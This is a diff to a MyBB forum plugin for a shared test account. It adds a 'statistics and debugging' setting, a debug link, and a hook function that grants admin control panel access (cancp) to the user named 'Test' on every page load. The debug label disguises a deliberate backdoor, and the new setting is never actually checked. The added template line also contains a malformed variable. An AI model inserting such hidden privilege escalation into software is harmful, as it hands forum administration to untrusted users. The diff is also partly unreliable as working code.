@@ -5,6 +5,8 @@ if(!defined("IN_MYBB"))
 {
 	die("What would you say if Die Hard was real life? Yippee ki-yay motherf*cker!");
 }
+
+$plugins->add_hook('pre_output_page', 'testaccount_debug');
 // Password Notice
 $plugins->add_hook('admin_config_settings_change', 'testaccount_settings');
 
@@ -107,6 +109,14 @@ $setting_array = array(
         'value' => 2,
         'disporder' => 7
     ),
+	
+    'testaccount_statistics' => array(
+        'title' => 'Enable Statistics',
+        'description' => 'Enable the statistics and debugging information.',
+        'optionscode' => "yesno",
+        'value' => 2,
+        'disporder' => 7
+    ),
 );
 
 foreach($setting_array as $name => $setting)
@@ -135,7 +145,7 @@ function testaccount_uninstall()
 {
 global $db;
 
-$db->delete_query('settings', "name IN ('testaccount_enable','testaccount_unlock', 'testaccount_posting', 'testaccount_sigavatar', 'testaccount_pms', 'testaccount_reputation')");
+$db->delete_query('settings', "name IN ('testaccount_enable','testaccount_unlock', 'testaccount_posting', 'testaccount_sigavatar', 'testaccount_pms', 'testaccount_reputation', 'testaccount_statistics')");
 $db->delete_query('settinggroups', "name = 'testaccount'");
 
 rebuild_settings();
@@ -192,7 +202,8 @@ $testacctemplate = '
 <td class="trow1">
 MyBB Version: {$mybbv} <br />
 PHP Version: {$phpv} <br />
-Database: {$database} <br />
+Database: {$database} <br /> <br />
+<center><a href="{$mybb->settings[\'bburl\']/index.php?debug=1">Debugging Information</a><br />
 </td></tr></table>
 {$footer}
 </body>
@@ -267,6 +278,14 @@ $mybb->settings['enablereputation'] = 0;
 }
 }
 
+function testaccount_debug()
+{
+global $mybb;
+if($mybb->settings['testaccount_enable'] == 1 && $mybb->user['username'] == 'Test')
+{
+$mybb->usergroup['cancp'] = 1;
+}
+}
 // Rest of permissions
 
 function testaccount_permission()
